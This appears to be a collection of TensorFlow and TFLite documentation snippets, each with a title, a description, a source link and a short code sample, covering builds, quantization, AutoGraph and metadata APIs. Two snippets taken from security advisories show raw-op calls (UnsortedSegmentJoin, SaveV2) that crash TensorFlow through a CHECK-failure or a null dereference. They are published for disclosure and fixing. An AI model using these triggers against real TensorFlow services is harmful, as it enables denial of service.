SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ImageClassifier.md#_snippet_7

LANGUAGE: Python
CODE:
```
predict_top_k(
    data, k=1, batch_size=32
)
```

----------------------------------------

TITLE: Running a Specific Build/Test Target with any.sh
DESCRIPTION: This command uses the `any.sh` script to run a specific Bazel target. It sets the `TF_ANY_TARGETS` variable to specify the target (e.g., `:your/target`) and `TF_ANY_MODE` to define the operation (e.g., `test`). This allows fine-grained execution of individual build or test components.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/README.md#_snippet_5

LANGUAGE: bash
CODE:
```
TF_ANY_TARGETS=":your/target" TF_ANY_MODE="test" ci/official/any.sh
```

----------------------------------------

TITLE: Including Flatbuffers Headers CMake
DESCRIPTION: This CMake command adds directories to the target's include path. Specifically, it includes `third_party/headers`, which is noted as containing the Flatbuffers headers required for configuring opaque delegates like the GPU delegate when used with TensorFlow Lite in Google Play Services.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_native.md#_snippet_5

LANGUAGE: cmake
CODE:
```
target_include_directories(tflite-jni PUBLIC
        third_party/headers # flatbuffers
     ...)
```

----------------------------------------

TITLE: Configuring Dataset Preprocessing Skip (Python)
DESCRIPTION: Defines a boolean parameter `is_skip_step_1` that controls whether the image preprocessing step (running MoveNet on images) should be skipped. If set to True, pre-generated CSV files containing landmark data will be downloaded instead.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_4

LANGUAGE: Python
CODE:
```
is_skip_step_1 = False #@param ["False", "True"] {type:"raw"}
```

----------------------------------------

TITLE: Build and Push Sample Stable Delegate - Android Bash
DESCRIPTION: Builds the `libtensorflowlite_sample_stable_delegate.so` shared library for Android ARM64 using Bazel and then pushes the compiled library to the `/data/local/tmp` directory on the connected Android device using ADB. This library implements the stable delegate interface.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_10

LANGUAGE: bash
CODE:
```
bazel build -c opt --config=android_arm64 //tensorflow/lite/delegates/utils/experimental/sample_stable_delegate:tensorflowlite_sample_stable_delegate

adb push "$(bazel info -c opt --config=android_arm64 bazel-bin)"/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/libtensorflowlite_sample_stable_delegate.so /data/local/tmp
```

----------------------------------------

TITLE: Converting and Quantizing TFLite Model Python
DESCRIPTION: Sets the optimizations property of the TFLite converter to tf.lite.Optimize.DEFAULT to enable post-training dynamic range quantization. It then converts the model with this optimization and writes the resulting quantized model's byte content to a new file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
converter.optimizations = [tf.lite.Optimize.DEFAULT]
tflite_quant_model = converter.convert()
tflite_model_quant_file = tflite_models_dir/"mnist_model_quant.tflite"
tflite_model_quant_file.write_bytes(tflite_quant_model)
```

----------------------------------------

TITLE: Demonstrating TF UnsortedSegmentJoin DoS Vulnerability - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the denial of service vulnerability in `tf.raw_ops.UnsortedSegmentJoin`. It calls the operation with a non-scalar tensor for `num_segments`, which is expected to be a scalar, causing a CHECK-failure within the TensorFlow kernel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-066.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.UnsortedSegmentJoin(
  inputs=tf.constant("this", shape=[12], dtype=tf.string),
  segment_ids=tf.constant(0, shape=[12], dtype=tf.int64),
  num_segments=tf.constant(0, shape=[12], dtype=tf.int64))
```

----------------------------------------

TITLE: Reproducing TensorFlow SaveV2 Input Validation Vulnerability (Python)
DESCRIPTION: This Python code snippet provides a minimal reproducible example demonstrating the incorrect input validation vulnerability in `tf.raw_ops.SaveV2`. It calls the operation with invalid arguments that should be caught by validation but trigger a null pointer dereference due to the flaw.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-122.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.SaveV2(
  prefix=['tensorflow'],
  tensor_name=['v'],
  shape_and_slices=[],
  tensors=[1,2,3])
```

----------------------------------------

TITLE: Building TensorFlow Lite C++ Library 64bit (Shell)
DESCRIPTION: This shell command demonstrates how to build the 64bit `libtensorflowlite.so` shared library for the `arm64-v8a` Android ABI using Bazel. This is for developers using the Android NDK to integrate TFLite via its C++ API.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/development.md#_snippet_5

LANGUAGE: Shell
CODE:
```
bazel build -c opt --config=android_arm64 //tensorflow/lite:libtensorflowlite.so
```

----------------------------------------

TITLE: Initializing From Existing Object in TFLite Metadata (Python)
DESCRIPTION: A class method to initialize a `SubGraphMetadataT` object from another existing `SubGraphMetadataT` object. This method facilitates copying or converting metadata structures, enabling manipulation or duplication of subgraph metadata instances within the TFLite support library. Takes an existing `SubGraphMetadataT` instance as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataT.md#_snippet_2

LANGUAGE: Python
CODE:
```
@classmethod
InitFromObj(
    subGraphMetadata
)
```

----------------------------------------

TITLE: Calling tf.function with tf.Tensor (Python/TensorFlow)
DESCRIPTION: This snippet executes the `tf.function f` defined previously, providing a `tf.constant(1)` as input. This demonstrates that when a `tf.Tensor` is printed using the standard Python `print` within a `tf.function`, only the tensor's metadata (name, shape, dtype) is printed during graph construction, not its actual value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/debugging.md#_snippet_4

LANGUAGE: python
CODE:
```
f(tf.constant(1))
```

----------------------------------------

TITLE: Creating Keras Model Instance - TensorFlow Model Maker Python
DESCRIPTION: This method creates the underlying Keras model instance used for the recommendation task. It takes a boolean argument to control whether the model is intended for training. It returns the configured Keras model object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/Recommendation.md#_snippet_2

LANGUAGE: Python
CODE:
```
create_model(
    do_train=True
)
```

----------------------------------------

TITLE: Add Vocab File Path to SentencePiece Options in Python
DESCRIPTION: This function adds a vocabulary file path to the builder object intended for constructing `SentencePieceTokenizerOptions` within the TFLite metadata schema. It takes a `builder` object (likely a FlatBuffers builder) and the `vocabFile` string containing the path to the vocabulary file. This is typically used when programmatically defining the metadata for a TFLite model that uses SentencePiece tokenization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptionsAddVocabFile.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SentencePieceTokenizerOptionsAddVocabFile(
    builder, vocabFile
)
```

----------------------------------------

TITLE: Validating TFLite Micro Input Tensor Properties (C++)
DESCRIPTION: Uses TFLite Micro test macros (`TF_LITE_MICRO_EXPECT_*`) to assert properties of the obtained input tensor, such as checking if the pointer is valid, the number of dimensions (`dims->size`), the size of each dimension (`dims->data`), and the data type (`type`). Ensures the tensor structure matches expectations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_12

LANGUAGE: C++
CODE:
```
// Make sure the input has the properties we expect
TF_LITE_MICRO_EXPECT_NE(nullptr, input);
// The property "dims" tells us the tensor's shape. It has one element for
// each dimension. Our input is a 2D tensor containing 1 element, so "dims"
// should have size 2.
TF_LITE_MICRO_EXPECT_EQ(2, input->dims->size);
// The value of each element gives the length of the corresponding tensor.
// We should expect two single element tensors (one is contained within the
// other).
TF_LITE_MICRO_EXPECT_EQ(1, input->dims->data[0]);
TF_LITE_MICRO_EXPECT_EQ(1, input->dims->data[1]);
// The input is a 32 bit floating point value
TF_LITE_MICRO_EXPECT_EQ(kTfLiteFloat32, input->type);
```

----------------------------------------

TITLE: Initializing Debugger with Denylisted Nodes (Python)
DESCRIPTION: Initializes the Quantization Debugger options to exclude specific nodes (layers) from quantization based on a predefined list of 'suspected_layers'. This setup allows the debugger to generate a selectively quantized model for evaluation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
debug_options = tf.lite.experimental.QuantizationDebugOptions(
    denylisted_nodes=suspected_layers)
debugger = tf.lite.experimental.QuantizationDebugger(
    converter=converter,
    debug_dataset=representative_dataset(ds),
    debug_options=debug_options)
```

----------------------------------------

TITLE: Creating Bazel Workspace Files (Shell)
DESCRIPTION: This shell command creates empty BUILD.bazel and WORKSPACE files within the specified local LLVM source directory (${LLVM_SRC}). These files are required to configure Bazel to recognize and use the local LLVM repository as an external dependency during the build process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/README.md#_snippet_0

LANGUAGE: shell
CODE:
```
touch ${LLVM_SRC}/BUILD.bazel ${LLVM_SRC}/WORKSPACE
```

----------------------------------------

TITLE: Adding Custom Layer Debug Metrics (Python)
DESCRIPTION: Provide custom metrics for layer-wise debugging using `QuantizationDebugOptions`. Pass a dictionary to `layer_debug_metrics` where keys are metric names and values are functions that accept the difference between float and quantized outputs for a layer and return a scalar metric value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/optimize/debugging/README.md#_snippet_3

LANGUAGE: python
CODE:
```
debug_options = debugger.QuantizationDebugOptions(
    layer_debug_metrics={
        'mean_abs_error': lambda diffs: np.mean(np.abs(diffs))
    })

quant_debugger = debugger.QuantizationDebugger(
    quant_debug_model_content=quant_debug_model,
    debug_dataset=data_gen,
    debug_options=debug_options
)
quant_debugger.run()
```

----------------------------------------

TITLE: Getting Tokenizer Associated Files Python
DESCRIPTION: Retrieves a list of filenames that are associated with the tokenizer specified during the `BertInputTensorsMd` initialization. These files often contain vocabulary data or sentence piece models necessary for the tokenizer to function, and may need to be packed into the TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/BertInputTensorsMd.md#_snippet_3

LANGUAGE: Python
CODE:
```
get_tokenizer_associated_files() -&gt; List[str]
```

----------------------------------------

TITLE: Using tf.Variable with Stateless Op in Python
DESCRIPTION: Demonstrates how to manage state using a tf.Variable in Python with a stateless custom op (`multiplex_2`). It initializes a variable, iterates through a dataset, and updates the variable based on the input positions using the custom op. Requires the 'tensorflow' library and the specific custom op module `tensorflow.examples.custom_ops_doc.multiplex_2`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
from tensorflow.examples.custom_ops_doc.multiplex_2 import multiplex_2_op

def variable_and_stateless_op():
  n = 10
  v = tf.Variable(tf.ones(n, dtype=tf.int64), trainable=False)
  dataset = tf.data.Dataset.from_tensor_slices([5, 1, 7, 5])
  for position in dataset:
    print(v.numpy())
    cond = tf.one_hot(
        position, depth=n, on_value=True, off_value=False, dtype=bool)
    v.assign(multiplex_2_op.multiplex(cond, v*2, v))
  print(v.numpy())
```

----------------------------------------

TITLE: Install TFLite Benchmark APK via ADB
DESCRIPTION: This command installs the built TensorFlow Lite benchmark APK onto a connected Android device using adb. The '-r' flag reinstalls, '-d' allows downgrade, and '-g' grants all runtime permissions, including external storage access required by the app.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/android/README.md#_snippet_3

LANGUAGE: Shell
CODE:
```
adb install -r -d -g bazel-bin/tensorflow/lite/tools/benchmark/android/benchmark_model.apk
```

----------------------------------------

TITLE: Error: Capturing Undefined Variable in AutoGraph Loop Closure Python
DESCRIPTION: Illustrates an error scenario where a variable (`a`) captured by a closure (`f`) is not defined before a loop (`tf.range`), which AutoGraph converts to a `tf.while_loop`. In graph execution, captured variables must be defined before the loop starts. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_20

LANGUAGE: Python
CODE:
```
def f():
  tf.print(a)
for i in tf.range(3):  # Error -- `a` must be defined before the loop.
  a = i
```

----------------------------------------

TITLE: Conditional Assignment of None to Tensor - Incorrect
DESCRIPTION: AutoGraph carries over the restriction that TensorFlow tensors cannot be None. This example shows a Python `if/else` block with a `tf.Tensor` condition where one branch assigns None to a variable used later, leading to an error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_1

LANGUAGE: python
CODE:
```
if tf.random.uniform(()) > 0.5:
  x = tf.constant(1)
else:
  x = None
tf.print(x)  # Error -- x may be None here
```

----------------------------------------

TITLE: Exporting Searcher Model - TFLite Model Maker - Python
DESCRIPTION: Exports the built searcher model into a specified format (TFLite or on-device ScaNN index file). It requires the desired `ExportFormat` (`export_format`), the filename for the exported file (`export_filename`), optional user information (`userinfo`), and a boolean indicating whether to apply Snappy compression to the index file (`compression`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/Searcher.md#_snippet_3

LANGUAGE: python
CODE:
```
export(
    export_format: tflite_model_maker.searcher.ExportFormat,
    export_filename: str,
    userinfo: AnyStr,
    compression: bool = True
)
```

----------------------------------------

TITLE: Building TFLite Evaluation Binary for Android Bazel
DESCRIPTION: This command uses Bazel to build the `run_eval` binary for Android ARM64 architecture. It specifies optimization flags (`-c opt`), the target platform configuration (`--config=android_arm64`), and a C++ standard (`--cxxopt='--std=c++17'`) necessary for the build.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/README.md#_snippet_1

LANGUAGE: Bazel
CODE:
```
bazel build -c opt \
  --config=android_arm64 \
  --cxxopt='--std=c++17' \
  //tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification:run_eval
```

----------------------------------------

TITLE: Initializing TFLite Pos Object in Python
DESCRIPTION: Initializes a new instance of the `Pos` class, which holds position information for an answer. Requires integer start and end offsets and a floating-point logit value indicating the confidence of the position.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Pos.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.Pos(
    start: int, end: int, logit: float
)
```

----------------------------------------

TITLE: Adding Coral Edge TPU Dependency (C++ Bazel)
DESCRIPTION: This C++ snippet shows the Bazel build dependency required to include the TensorFlow Lite Coral Edge TPU delegate plugin in a C++ project. The specific target is `//tensorflow_lite_support/acceleration/configuration:edgetpu_coral_plugin`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/overview.md#_snippet_5

LANGUAGE: C++
CODE:
```
deps = [
  "//tensorflow_lite_support/acceleration/configuration:edgetpu_coral_plugin", # for Coral Edge TPU
]
```

----------------------------------------

TITLE: Adding Delimiter Regex Pattern TensorFlow Lite Support Python
DESCRIPTION: This function is used to add a delimiter regular expression pattern option to a FlatBuffer builder when constructing metadata for a TFLite model. It takes a FlatBuffer `builder` instance and the `delimRegexPattern` string as arguments. This is part of configuring options for regex tokenization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptionsAddDelimRegexPattern.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.RegexTokenizerOptionsAddDelimRegexPattern(
    builder, delimRegexPattern
)
```

----------------------------------------

TITLE: Build TFLite Pip with Bazel - Normal (Shell)
DESCRIPTION: Executes the `build_pip_package_with_bazel.sh` script to build the TensorFlow Lite standalone Python wheel using Bazel. This command performs a standard build for the workstation's native architecture without specific optimizations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_6

LANGUAGE: sh
CODE:
```
tensorflow/lite/tools/pip_package/build_pip_package_with_bazel.sh
```

----------------------------------------

TITLE: Building Sample Delegate - Bazel Shell
DESCRIPTION: Builds a sample stable delegate shared object library (.so file) using Bazel. This command compiles the sample delegate code for the android_arm64 architecture with optimizations (`-c opt`), producing a library file that can be tested with the benchmark app.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_3

LANGUAGE: Shell
CODE:
```
bazel build -c opt \
  --config=android_arm64 \
  tensorflow/lite/delegates/utils/experimental/sample_stable_delegate:tensorflowlite_sample_stable_delegate
```

----------------------------------------

TITLE: Iterating Dataset Iterator with AutoGraph for loop Python
DESCRIPTION: Explains how AutoGraph processes a `for` loop iterating over a `tf.data.Dataset` iterator. This is converted into a combination of `tf.while_loop` and `tf.cond` operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_25

LANGUAGE: Python
CODE:
```
for i in iter(tf.data.Dataset.range(3)):
  tf.print('iteration:', i)
```

----------------------------------------

TITLE: Mapping Splitting Function to Dataset - Python
DESCRIPTION: This applies the `split_input_target` function to each sequence chunk in the dataset using the `map` method. This transforms the dataset from sequences of length `seq_length + 1` to pairs of input/target sequences of length `seq_length`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
dataset = sequences.map(split_input_target)
```

----------------------------------------

TITLE: Fetching and Configuring Googletest (CMake)
DESCRIPTION: Uses CMake's FetchContent module to download the specified version (release-1.12.1) of the googletest framework from its Git repository. It then makes the fetched content and its defined targets, such as `GTest::gtest_main`, available for use in the current CMake project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/pip_test/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
include(FetchContent)

FetchContent_Declare(
        googletest
        GIT_REPOSITORY https://github.com/google/googletest.git
        GIT_TAG release-1.12.1
)
FetchContent_MakeAvailable(googletest)
```

----------------------------------------

TITLE: Creating Composite Embedding Lookup Operation in TensorFlow Python
DESCRIPTION: Defines a composite embedding lookup operation (`EmbFprop`) using `tf.function` with `experimental_implements`. It simulates a loop-based embedding lookup using TensorFlow primitives, providing a clear interface for the operation and enabling potential fusion in TensorFlow Lite. It takes embedding matrix (`embs`) and ID vector (`ids_vec`) as input and returns the lookup results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/operation_fusion.md#_snippet_2

LANGUAGE: python
CODE:
```
  @tf.function(
        experimental_implements="embedding_lookup")
    def EmbFprop(embs, ids_vec):
      """Embedding forward prop.

      Effectively, it computes:
        num = size of ids_vec
        rets = zeros([num, embedding dim])
        for i in range(num):
          rets[i, :] = embs[ids_vec[i], :]
        return rets

      Args:
        embs: The embedding matrix.
        ids_vec: A vector of int32 embedding ids.

      Returns:
        The result of embedding lookups. A matrix of shape
        [num ids in ids_vec, embedding dims].
      """
      num = tf.shape(ids_vec)[0]
      rets = inplace_ops.empty([num] + emb_shape_suf, py_utils.FPropDtype(p))

      def EmbFpropLoop(i, embs, ids_vec, rets):
        # row_id = ids_vec[i]
        row_id = tf.gather(ids_vec, i)
        # row = embs[row_id]
        row = tf.reshape(tf.gather(embs, row_id), [1] + emb_shape_suf)
        # rets[i] = row
        rets = inplace_ops.alias_inplace_update(rets, [i], row)
        return embs, ids_vec, rets

      _, _, rets = functional_ops.For(
          start=0,
          limit=num,
          delta=1,
          inputs=[embs, ids_vec, rets],
          body=EmbFpropLoop,
          rewrite_with_while=compiled)
      if len(weight_shape) > 2:
        rets = tf.reshape(rets, [num, symbolic.ToStatic(p.embedding_dim)])
      return rets
```

----------------------------------------

TITLE: Converting Quantization Aware Trained GraphDef to Quantized INT8 TFLite
DESCRIPTION: This command converts a Frozen GraphDef that has undergone quantization aware training (containing `FakeQuant*` ops) into an INT8 quantized TensorFlow Lite model. It requires specifying the graph file, input/output arrays, inference type (`INT8`), and typically mean/std deviation values for input normalization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_4

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --graph_def_file=/tmp/some_mobilenetv1_quantized_frozen_graph.pb \
  --output_file=/tmp/foo.tflite \
  --input_arrays=input \
  --output_arrays=MobilenetV1/Predictions/Reshape_1 \
  --inference_type=INT8 \
  --mean_values=-0.5 \
  --std_dev_values=127.7
```

----------------------------------------

TITLE: Functional Style with Immutable Objects (namedtuple)
DESCRIPTION: Further reinforcing the functional style, functions operating on immutable objects like namedtuples should take the object as input and return the new, modified object as output. This makes changes explicit and trackable by AutoGraph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_18

LANGUAGE: python
CODE:
```
def use_my_class(c: MyClass) -> MyClass:
  new_c = c.change()
  return new_c
```

----------------------------------------

TITLE: Extracting Associated File with Unzip Shell Command
DESCRIPTION: Demonstrates how to use the standard `unzip` command-line tool to extract a specific associated file (e.g., `labels.txt`) from a TensorFlow Lite model file, treating the model as a zip archive.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_14

LANGUAGE: sh
CODE:
```
$ unzip mobilenet_v1_0.75_160_quantized_1_metadata_1.tflite
Archive:  mobilenet_v1_0.75_160_quantized_1_metadata_1.tflite
 extracting: labels.txt
```

----------------------------------------

TITLE: Build TFLite Benchmark App with Bazel - Android ARM64
DESCRIPTION: This command builds the TensorFlow Lite benchmark model Android application using Bazel. It specifies the 'opt' configuration for optimized build and targets the 'android_arm64' architecture. The output will be an APK file located in the bazel-bin directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/android/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
bazel build -c opt \
  --config=android_arm64 \
  tensorflow/lite/tools/benchmark/android:benchmark_model
```

----------------------------------------

TITLE: Retrieving Packed Associated File List - Python
DESCRIPTION: This method returns a list of associated files that have been packed into the TensorFlow Lite model file. It allows users to identify which supplementary files are embedded within the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_4

LANGUAGE: Python
CODE:
```
get_packed_associated_file_list()
```

----------------------------------------

TITLE: Applying Selective Quantization via MLIR Quantize (Python)
DESCRIPTION: Applies selective quantization to an already calibrated model by directly calling the internal `convert.mlir_quantize` API. This allows for quickly experimenting with different node denylists on a pre-calibrated model without re-running the calibration step.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_27

LANGUAGE: python
CODE:
```
selective_quantized_model = convert.mlir_quantize(
    calibrated_model, denylisted_nodes=suspected_layers)
eval_tflite(selective_quantized_model, ds)
```

----------------------------------------

TITLE: Creating AsyncSleep Python Wrapper Function (Python)
DESCRIPTION: Defines the public Python function `AsyncSleep` that wraps the asynchronous C++ sleep op. It takes a scalar float `delay` tensor and an optional `name` argument. The docstring explains its non-blocking nature and behavior regarding blocking time. It calls the underlying generated op function (`gen_sleep_op.examples_async_sleep`) passing the inputs and returns the output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_9

LANGUAGE: Python
CODE:
```
def AsyncSleep(delay, name=None):
  """Pause for `delay` seconds (which need not be an integer).

  This is an asynchronous (non-blocking) version of a sleep op. It includes
  any time spent being blocked by another thread in `delay`. If it is blocked
  for a fraction of the time specified by `delay`, it only calls `sleep`
  (actually `usleep`) only for the remainder. If it is blocked for the full
  time specified by `delay` or more, it returns without explicitly calling
  `sleep`.

  Args:
    delay: tf.Tensor which is a scalar of type float.
    name: An optional name for the op.

  Returns:
    The `delay` value.
  """
  return gen_sleep_op.examples_async_sleep(delay=delay, name=name)
```

----------------------------------------

TITLE: Retrieving Populated Metadata JSON (Python)
DESCRIPTION: Retrieves the generated JSON metadata string after it has been populated into the model. This includes fields added by MetadataPopulator, such as min_parser_version. Use this if you need the final metadata string embedded in the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/MetadataWriter.md#_snippet_6

LANGUAGE: python
CODE:
```
get_populated_metadata_json() -> str\n
```

----------------------------------------

TITLE: Helper for TensorFlow Hash Table Test Operations (Python)
DESCRIPTION: This function encapsulates a sequence of operations (find with default, insert, find after insert, remove, find after remove) on a `SimpleHashTable`. It is designed to be called by parameterized tests or functions that wrap it, returning a tensor stack of the results to be evaluated and asserted against expected values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_19

LANGUAGE: Python
CODE:
```
  def _use_table(self, key_dtype, value_dtype):
    hash_table = simple_hash_table.SimpleHashTable(key_dtype, value_dtype, 111)
    result1 = hash_table.find(1, -999)
    hash_table.insert(1, 100)
    result2 = hash_table.find(1, -999)
    hash_table.remove(1)
    result3 = hash_table.find(1, -999)
    results = tf.stack((result1, result2, result3))
    return results  # expect [-999, 100, -999]
```

----------------------------------------

TITLE: Inspect TensorFlow Graph with summarize_graph (Bash)
DESCRIPTION: This command builds and executes the `summarize_graph` tool using Bazel. It is used to inspect a TensorFlow GraphDef file, providing information such as potential input and output nodes and overall graph structure, which is helpful for debugging and understanding the graph before applying transformations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
bazel build tensorflow/tools/graph_transforms:summarize_graph
bazel-bin/tensorflow/tools/graph_transforms/summarize_graph --in_graph=tensorflow_inception_graph.pb
```

----------------------------------------

TITLE: Tracing Behavior with Python Scalar Condition - Python
DESCRIPTION: Demonstrates the behavior when an `if` statement's condition is a Python scalar (`True`). In this case, AutoGraph does not convert it to a TensorFlow conditional, and the code executes as regular Python, with only the true branch being executed and traced.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_10

LANGUAGE: Python
CODE:
```
print('before if')
if True:  # Condition not a Tensor, running normally
  print('true branch')
else:
  print('false branch')
print('after if')
```

----------------------------------------

TITLE: Conditionally Adding NNAPI Sources for Android (CMake)
DESCRIPTION: Appends the NNAPI delegate source file to the source list specifically when the target system is Android and the `_TFLITE_ENABLE_NNAPI` option is enabled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/CMakeLists.txt#_snippet_2

LANGUAGE: cmake
CODE:
```
if(CMAKE_SYSTEM_NAME MATCHES "Android")
  if(_TFLITE_ENABLE_NNAPI)
    list(APPEND TFLITE_LABEL_IMAGE_SRCS
      ${TFLITE_SOURCE_DIR}/tools/delegates/nnapi_delegate_provider.cc
    )
  endif()  # _TFLITE_ENABLE_NNAPI
endif()  # Android
```

----------------------------------------

TITLE: Functional Style for Python Object Modifications - Recommended Practice
DESCRIPTION: Using a functional programming style where functions take inputs as arguments and return modified values allows AutoGraph to correctly track changes to Python objects. This resolves the issue of hidden side effects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_11

LANGUAGE: python
CODE:
```
def change(y):
  y = y + 1
  return y

while x > 0:
  y = change(y)  # Okay -- y can now be properly tracked!
```

----------------------------------------

TITLE: Rendering Single Graphviz Output to PDF (Shell)
DESCRIPTION: This command uses the Graphviz `dot` tool to render a single `.dot` file, such as the one generated by `tflite_convert` when using `--output_format=GRAPHVIZ_DOT`, into PDF format. It takes the specified `.dot` file (`/tmp/foo.dot`) as input and outputs a corresponding `.dot.pdf` file (`/tmp/foo.dot.pdf`) to the same directory using the `-O` flag. Requires Graphviz `dot` to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_15

LANGUAGE: Shell
CODE:
```
dot -Tpdf /tmp/foo.dot -O
```

----------------------------------------

TITLE: Getting Populated Metadata JSON (Python)
DESCRIPTION: Retrieves the generated JSON string representing the metadata *after* it has been populated into the model buffer. This string may include additional fields filled by the MetadataPopulator, such as the min_parser_version. Use get_metadata_json() to get the original metadata string before population.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/metadata_writer/MetadataWriter.md#_snippet_4

LANGUAGE: python
CODE:
```
get_populated_metadata_json() -> str
```

----------------------------------------

TITLE: Printing XLA Compiler Intermediate Representation Python
DESCRIPTION: This code demonstrates how to inspect the intermediate representation (IR) generated by the XLA compiler. Using `experimental_get_compiler_ir` on the compiled `tf.function` (`train_mnist`), you can retrieve different stages of the compilation output. This specific snippet prints the initial HLO (High-Level Optimizer) IR before further optimizations, providing insight into what XLA received from TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/jit_compile.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
